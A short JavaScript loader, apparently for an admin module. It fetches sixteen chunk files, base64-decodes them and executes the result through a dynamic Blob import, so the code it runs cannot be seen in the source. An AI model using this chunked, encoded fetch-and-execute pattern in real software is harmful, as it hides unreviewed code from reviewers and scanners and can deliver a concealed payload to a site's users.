const parts=['01.txt','02.txt','03.txt','04.txt','05.txt','06.txt','07.txt','08.txt','09.txt','10.txt','11.txt','12.txt','13.txt','14.txt','15.txt','16.txt'];
const baseUrl=new URL('./admin-parts/',import.meta.url);
const raw=(await Promise.all(parts.map(async p=>{const r=await fetch(new URL(p,baseUrl));if(!r.ok)throw new Error('admin part '+p);return r.text();}))).join('');
const bytes=Uint8Array.from(atob(raw),c=>c.charCodeAt(0));
const code=new TextDecoder().decode(bytes);
const blob=new Blob([code],{type:'text/javascript'});
await import(URL.createObjectURL(blob));
